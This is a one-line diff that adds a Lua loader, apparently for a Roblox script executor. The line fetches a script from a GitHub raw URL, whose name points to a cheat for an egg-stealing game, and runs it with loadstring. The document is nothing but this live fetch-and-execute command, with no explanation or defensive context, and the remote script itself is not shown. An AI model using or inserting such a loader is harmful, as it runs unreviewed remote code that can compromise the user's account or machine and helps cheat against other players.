@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/break-and-steal-an-egg-spam6-w72851ojoaozh0.lua"))()
